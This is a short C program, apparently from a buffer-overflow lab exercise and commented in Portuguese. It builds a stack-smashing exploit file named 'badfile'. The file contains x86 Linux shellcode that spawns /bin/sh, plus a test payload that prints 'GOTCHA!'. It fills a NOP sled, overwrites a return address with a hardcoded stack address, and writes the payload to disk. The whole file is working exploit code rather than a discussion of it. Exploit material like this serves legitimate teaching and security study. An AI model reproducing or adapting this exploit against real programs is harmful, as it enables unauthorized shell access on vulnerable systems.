#include <stdlib.h>
#include <stdio.h>
#include <string.h>

//Shellcode que abre um shell
const char shellcode[] =
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;

//Shellcode que imprime GOTCHA!
const char printcode[] =
"\xeb\x16"      /* jmp string   */
"\x31\xdb"      /* xor ebx ebx */
"\x31\xd2"      /* xor edx edx */
"\x31\xc0"      /* xor eax eax */
"\x59"          /* pop ecx */
"\xbb\x01\x00\x00\x00"  /* mov $0x1, ebx */
"\xb2\x09"      /* mov 0x9 dl */
"\xb0\x04"      /* mov 0x04 al */
"\xcd\x80"      /* int 0x80 */
"\xb0\x01"      /* mov 0x1 al */
"\xcd\x80"      /* int 0x80 */
"\xe8\xe5\xff\xff\xff" /* call code */
"GOTCHA!\n"
;

//Fecha o programa sem erro
const char simples[] =
"\xb0\x01"      /* mov 0x1 al */
"\xcd\x80"      /* int 0x80 */
;


int main(void)
{
    FILE* badfile;
    char buffer[1024];

    memset(&buffer, 0x90, 1024);

    //Alterando endereco de retorno:
    buffer[20] = 0x00; //Descobrir o endereco dos shellcodes
    buffer[21] = 0xf5; 
    buffer[22] = 0xff;
    buffer[23] = 0xbf;

    //memcpy(&buffer[24], printcode, sizeof(printcode));
    memcpy(&buffer[sizeof(buffer)-sizeof(shellcode)], shellcode, sizeof(shellcode));
    //memcpy(&buffer[30], simples, sizeof(simples));

    badfile = fopen("./badfile", "w");
    fwrite(buffer, 1024, 1, badfile);
    fclose(badfile);

    return 0;
}

